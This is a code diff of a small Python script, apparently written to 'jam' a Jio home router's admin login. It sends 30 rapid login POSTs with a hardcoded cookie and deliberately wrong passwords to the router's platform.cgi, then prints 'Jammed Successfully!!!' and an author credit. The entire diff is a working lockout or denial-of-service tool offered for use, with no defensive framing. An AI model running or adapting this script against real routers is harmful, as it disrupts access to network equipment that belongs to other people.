@@ -1,8 +1,30 @@
+import random
 import requests
+import pyfiglet
+import os
 
-jio_lan_ip = input('Enter your Jio-IP: ')
+# COLOR
+green = '\033[92m'
+purple = '\033[95m'
+red = '\033[91m'
+cyan = '\033[96m'
+yellow = '\033[93m'
+bold = '\033[1m'
+end = '\033[0m'
+
+colorArr = [green, purple, red, cyan, yellow]
+color = random.choice(colorArr)
+fig = pyfiglet.figlet_format(" J i o ", font = "alligator" )   # pyfiglet
+os.system('cls')
+print(fig)
+
+jio_lan_ip = input(f"{cyan}Enter your Jio-Router IP {end}{yellow}(Press enter for default: 192.168.29.1):{end} {green}")
+print(f'{end}')
+if(jio_lan_ip == ""):
+    jio_lan_ip = '192.168.29.1'
+
 username = 'admin'
-password = '12345678'
+password = 'somepass'
 cookie = 'b5080ad6185a72e3681f100aab8a428'
 cookies = {
     'TeamF1Login': cookie,
@@ -21,13 +43,19 @@ headers = {
     'Accept-Language': 'en-US,en;q=0.9',
 }
 
-data = {
-    'thispage': 'index.html',
-    'users.username': username,
-    'users.password': password,
-    'button.login.users.dashboard': 'Login'
-}
 
-for i in range(1,30):
+for i in range(1,31):
+    password+=str(i)+str(2)
+    data = {
+        'thispage': 'index.html',
+        'users.username': username,
+        'users.password': password,
+        'button.login.users.dashboard': 'Login'
+    }
     response = requests.post(f'http://{jio_lan_ip}/platform.cgi', headers=headers, cookies=cookies, data=data, verify=False)
+    print(f'{cyan}Sending keys: {end}{green}{username}{yellow}:{end}{password}{end}')
+    password='somepass'
     response.close()
+
+print(f'{cyan}Jammed Successfully!!!{end}')
+print(f'\nCREDITS:- {green}@0xchirantan{end}\n')
